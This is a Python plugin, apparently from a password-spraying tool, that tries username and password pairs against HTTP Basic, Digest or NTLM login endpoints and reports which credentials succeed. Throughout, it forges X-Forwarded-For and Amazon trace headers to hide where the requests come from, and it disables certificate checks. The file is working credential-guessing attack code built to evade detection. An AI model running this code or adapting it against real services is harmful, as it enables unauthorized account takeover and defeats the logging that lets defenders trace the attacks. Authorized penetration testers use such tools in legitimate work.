import requests, requests_ntlm
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def httpbrute_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    # CHANGEME: Add more if necessary
    headers = {
        'User-Agent' : useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:

        resp = None

        full_url = f"{url}/{pluginargs['uri']}"

        if pluginargs['auth'] == 'basic':
            auth = requests.auth.HTTPBasicAuth(username, password)
            resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)

        elif pluginargs['auth'] == 'digest':
            auth = requests.auth.HTTPDigestAuth(username, password)
            resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)

        else: # NTLM
            auth = requests_ntlm.HttpNtlmAuth(username, password)
            resp = requests.get(url=full_url, auth=auth, verify=False, timeout=30)


        if resp.status_code == 200:
            data_response['result'] = "success"
            data_response['output'] = f"[+] SUCCESS: => {username}:{password}"
            data_response['valid_user'] = True

        elif resp.status_code == 401:
            data_response['result'] = "failure"
            data_response['output'] = f"[-] FAILURE: => {username}:{password}"

        else: #fail
            data_response['result'] = "potential"
            data_response['output'] = f"[?] UNKNOWN_RESPONSE_CODE: {resp.status_code} => {username}:{password}"


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
